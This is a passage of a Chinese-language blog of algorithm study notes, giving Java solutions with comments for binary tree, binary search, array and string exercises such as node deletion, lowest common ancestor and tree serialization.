<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="comment">//找到节点，删除节点</span></span><br><span class="line">        <span class="comment">//调整树，上移左子树最右边的节点，或者上移右子树最左边的节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> root,pre=<span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node.val&gt;key)&#123;</span><br><span class="line">                pre=node;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node.val&lt;key)&#123;</span><br><span class="line">                pre = node;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标节点找父节点，</span></span><br><span class="line">        <span class="keyword">if</span>(pre==<span class="literal">null</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.left!=<span class="literal">null</span>&amp;&amp;pre.left.val==key)&#123;</span><br><span class="line">            pre.left = deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.right!=<span class="literal">null</span>&amp;&amp;pre.right.val==key)&#123;</span><br><span class="line">            pre.right = deleteNode(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被删除节点的右子树为空，左孩子补位</span></span><br><span class="line">        <span class="keyword">if</span>(root.right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被删除节点右孩子不为空，将被删除节点的左子树移动到右孩子节点的最左节点的下面</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> root.right;</span><br><span class="line">        <span class="keyword">while</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        node.left = root.left;</span><br><span class="line">        <span class="keyword">return</span> root.right;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="找到最近的公共祖先"><a href="#找到最近的公共祖先" class="headerlink" title="找到最近的公共祖先"></a>找到最近的公共祖先</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//就算找到了目标值，也需要遍历整个树，因为需要用到遍历的结果</span></span><br><span class="line"><span class="comment">//这里注意，如果左边没有找到为什么需要返回右边找到的哪一个</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//找到了节点</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||p==root||q==root)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">         <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">         <span class="comment">//左子树找到一个，右子树找到一个</span></span><br><span class="line">         <span class="keyword">if</span>(left!=<span class="literal">null</span>&amp;&amp;right!=<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="keyword">return</span> root;</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left==<span class="literal">null</span> &amp;&amp; right!=<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="comment">//左子树没有，右子树找到一个</span></span><br><span class="line">             <span class="keyword">return</span> right;</span><br><span class="line">         &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left!=<span class="literal">null</span>&amp;&amp;right==<span class="literal">null</span>)&#123;</span><br><span class="line">             <span class="comment">//左子树找到一个，右子树没有</span></span><br><span class="line">             <span class="keyword">return</span> left;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">//都没有找到</span></span><br><span class="line">             <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="序列化树："><a href="#序列化树：" class="headerlink" title="序列化树："></a>序列化树：</h2><blockquote>
<p>使用什么方式序列化的，就需要使用同样的方式进行反序列化</p>
</blockquote>
<h3 id="方法1：使用层次遍历"><a href="#方法1：使用层次遍历" class="headerlink" title="方法1：使用层次遍历"></a>方法1：使用层次遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">INF</span> <span class="operator">=</span> <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    String <span class="title function_">Serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">emptyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(INF);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">            result.append(String.valueOf(node.val)+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="comment">//只要该节点不是空节点，那么他的孩子节点就可以出来，至于是否是空节点需要考虑</span></span><br><span class="line">            <span class="keyword">if</span>(!node.equals(emptyNode))&#123;</span><br><span class="line">                deque.add(node.left==<span class="literal">null</span>?emptyNode:node.left);</span><br><span class="line">                deque.add(node.right==<span class="literal">null</span>?emptyNode:node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">Deserialize</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(str.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//根据分隔符进行分割</span></span><br><span class="line">       String[]ss = str.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span>ss.length;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.parseInt(ss[<span class="number">0</span>]));</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.add(root);</span><br><span class="line">        <span class="comment">//因为每次都是建立了两个节点，所以i需要加2</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n-<span class="number">1</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">            <span class="comment">//a b分别是左孩子节点和右孩子节点</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.parseInt(ss[i]),b = Integer.parseInt(ss[i+<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(a!=INF)&#123;</span><br><span class="line">                node.left = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(a);</span><br><span class="line">                deque.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(b!=INF)&#123;</span><br><span class="line">                node.right = <span class="keyword">new</span> <span class="title class_">TreeNode</span>(b);</span><br><span class="line">                deque.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="找到最近公共祖先节点"><a href="#找到最近公共祖先节点" class="headerlink" title="找到最近公共祖先节点"></a>找到最近公共祖先节点</h3><p>非递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        Map&lt;Integer,Integer&gt; parent = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        parent.put(root.val,-<span class="number">1</span>);</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()&amp;&amp;(!parent.containsKey(o1)||!parent.containsKey(o2)))&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                parent.put(node.left.val,node.val);</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                parent.put(node.right.val,node.val);</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; ancestors = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//得到o1的所有祖先节点</span></span><br><span class="line">        <span class="keyword">while</span>(parent.containsKey(o1))&#123;</span><br><span class="line">            ancestors.add(o1);</span><br><span class="line">            o1 = parent.get(o1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//同理</span></span><br><span class="line">        <span class="keyword">while</span>(!ancestors.contains(o2))&#123;</span><br><span class="line">            <span class="comment">//一直获取o2的祖先，直到o1的祖先里面包含了o2</span></span><br><span class="line">            o2 = parent.get(o2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> helper(root,o1,o2).val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查找目标节点。</span></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">helper</span><span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span>&#123;</span><br><span class="line">        <span class="comment">//如果当前节点为空，或者其值为目标值中的一个，那么就返回他</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||root.val==o1||root.val==o2)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> helper(root.left,o1,o2);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> helper(root.right,o1,o2);</span><br><span class="line">        <span class="comment">//如果left为null则说明，这两个系欸但在root节点的右子树上，只需返回右节点</span></span><br><span class="line">        <span class="keyword">if</span>(left==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果都不为null则表示，这两个节点一个在左子树上，一个在右子树上，就直接返回当前节点就可以了</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归:主要思想是，从根节点开始递归，以当前节点作为新的根节点，查找是否目标节点的位置（在当前节点的左子树、右子树、或者一左一右），</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowestCommonAncestor</span> <span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> helper(root,o1,o2).val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//，从当前节点开始，查找目标节点。递归的主体就是当前节点，</span></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">helper</span><span class="params">(TreeNode root, <span class="type">int</span> o1, <span class="type">int</span> o2)</span>&#123;</span><br><span class="line">        <span class="comment">//如果当前节点为空，或者其值为目标值中的一个，那么就返回他</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>||root.val==o1||root.val==o2)&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//left和right表示的是，目标节点到底在当前节点的左子树还是右子树上，是具体的哪个节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> helper(root.left,o1,o2);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> helper(root.right,o1,o2);</span><br><span class="line">        <span class="comment">//如果left为null则说明，这两个系欸但在root节点的右子树上，只需返回右节点</span></span><br><span class="line">        <span class="keyword">if</span>(left==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果都不为null则表示，这两个节点一个在左子树上，一个在右子树上，就直接返回当前节点就可以了</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>查找重复的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findRepeatNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == i)&#123;</span><br><span class="line">                <span class="comment">//只有这个才能下一步</span></span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[nums[i]] == nums[i])&#123;</span><br><span class="line">                <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//注意交换</span></span><br><span class="line">            temp = nums[i];</span><br><span class="line">            nums[i] =  nums[temp];</span><br><span class="line">            nums[temp] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二分查找："><a href="#二分查找：" class="headerlink" title="二分查找："></a>二分查找：</h2><p>二分查找的时候需要注意的是，有两种情况，区间表示：</p>
<ul>
<li>[left, right] <ul>
<li>则表示右端点是有效的，循环是while(left &lt;&#x3D; right)</li>
</ul>
</li>
<li>[left, right)<ul>
<li>表示右端点无效，循环是 while (left &lt; right)</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">missingNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//同样使用二分查找方法来找</span></span><br><span class="line">        <span class="keyword">if</span>(nums[nums.length-<span class="number">1</span>]!=nums.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//需要注意</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==mid)&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if(nums[mid]==mid)&#123;</span></span><br><span class="line">        <span class="comment">//     return mid+1;</span></span><br><span class="line">        <span class="comment">// &#125;else&#123;</span></span><br><span class="line">        <span class="comment">//     return mid;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">//注意二分查找结束的时候的结果，不满足条件之后，left = 右半的一个</span></span><br><span class="line">        <span class="comment">//right = 左半边的一个，所以直接返回left即可</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>二维数组二分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">Find</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span> [][] array)</span> &#123;</span><br><span class="line">        <span class="comment">//是要从右上角来进行二分</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> array.length;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> array[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> n-<span class="number">1</span>,row=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(row&lt;m &amp;&amp; col&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target == array[row][col])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(target&gt;array[row][col])&#123;</span><br><span class="line">                <span class="comment">//说明第row行的所有元素都不行</span></span><br><span class="line">                row++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//说明第col列都不合适，都大于target</span></span><br><span class="line">                col--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无目标的二分法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="comment">//二分法的变形，如果二分法没有目标值，则需要和端点进行比较，</span></span><br><span class="line">        <span class="comment">//这里比较的是右端点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[left]&lt;array[right])&#123;</span><br><span class="line">                <span class="keyword">return</span> array[left];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[right] )&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[mid]&lt;array[right])&#123;</span><br><span class="line">                <span class="comment">//注意这里不能-1，因为只是mid+1后面的数据不满足需求了</span></span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="comment">//二分法的变形，如果二分法没有目标值，则需要和端点进行比较，</span></span><br><span class="line">        <span class="comment">//这里比较的是左端点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[left]&lt;array[right])&#123;</span><br><span class="line">                <span class="keyword">return</span> array[left];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[left] )&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[mid]&lt;array[left])&#123;</span><br><span class="line">                <span class="comment">//注意这里不能-1，因为只是mid+1后面的数据不满足需求了</span></span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p><strong>JZ38</strong> <strong>字符串的排列</strong> 还需要再看看</p>
<p>二进制加法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length()-<span class="number">1</span>,j = b.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">jing</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>||j&gt;=<span class="number">0</span> ||jing!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">ii</span> <span class="operator">=</span> i&gt;=<span class="number">0</span>?a.charAt(i--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">jj</span> <span class="operator">=</span> j&gt;=<span class="number">0</span>?b.charAt(j--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            jing = ii+jj+jing;</span><br><span class="line">            result.insert(<span class="number">0</span>,jing%<span class="number">2</span>);</span><br><span class="line">            jing = jing/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>得到一个字符串的掩码（就是看各个位置上面是不是有1）</p>
<p>​        &#x2F;&#x2F;将1进行左移相应的位数，就可以得到相关的掩码</p>
<p>​        masks[i] |&#x3D; 1 &lt;&lt; words[i].charAt(j) - ‘a’;</p>
<h4 id="剑指-Offer-II-005-单词长度的最大乘积"><a href="#剑指-Offer-II-005-单词长度的最大乘积" class="headerlink" title="剑指 Offer II 005. 单词长度的最大乘积"></a><a href="https://leetcode-cn.com/problems/aseY1I/">剑指 Offer II 005. 单词长度的最大乘积</a></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(String[] words)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> words.length;</span><br><span class="line">        <span class="type">int</span>[] masks = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">        <span class="comment">//得到字符串数组中的每个元素的掩码</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; words[i].length(); j 